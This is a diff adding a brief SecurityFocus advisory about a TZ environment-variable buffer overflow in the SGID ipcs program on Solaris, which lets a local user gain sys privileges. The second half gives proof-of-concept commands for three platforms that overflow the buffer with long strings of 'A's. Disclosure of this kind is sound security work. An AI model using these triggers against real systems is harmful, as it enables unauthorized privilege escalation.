@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/2581/info
+
+Solaris is the variant of the UNIX Operating System distributed by Sun Microsystems. Solaris is designed as a scalable operating system for the Intel x86 and Sun Sparc platforms, and operates on machines varying from desktop to enterprise server.
+
+A problem in the handling of environment variables by the SGID sys program ipcs could lead to local users gaining elevated privileges. Improper bounds checking of the buffer holding the TIMEZONE environment variable by the program could lead to a buffer overflow, and the overwriting of stack variables including the return address.
+
+Therefore, it is possible for a local user to execute arbitrary code with the EUID of sys, and potentially gain further elevated privileges. 
+
+Solaris 7 Sparc:
+$ TZ=`perl -e 'print "A"x1107'`
+$ /usr/bin/ipcs
+
+Solaris 8 Sparc:
+$ TZ=`perl -e 'print "A"x1199'`
+$ /usr/bin/ipcs
+
+Solaris x86:
+$ TZ=`perl -e 'print "A"x1035'`
+$ /usr/bin/i86/ipcs 
